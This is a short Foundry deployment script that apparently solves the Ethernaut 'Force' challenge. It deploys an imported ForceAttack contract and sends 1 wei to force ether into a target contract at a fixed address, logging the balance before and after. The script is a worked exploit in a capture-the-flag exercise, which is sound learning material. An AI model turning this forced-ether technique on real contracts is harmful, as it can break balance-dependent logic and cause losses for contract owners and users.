// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/levels/Force.sol";
import {ForceAttack} from "../src/attacks/ForceAttack.sol";

contract ForceScript is Script {
    Force public instance = Force(payable(0xF62f3CBb0879eFc3aF04a30Db0BDF1Fb794099C0));

    function run() external {
	vm.startBroadcast();
	ForceAttack attacker = new ForceAttack();
	console.log("Force Contract initial balance:", address(instance).balance);
	attacker.attack{value: 1 wei}(payable(address(instance)));
	console.log("Force Contract new balance:", address(instance).balance);
	vm.stopBroadcast();
    }
}
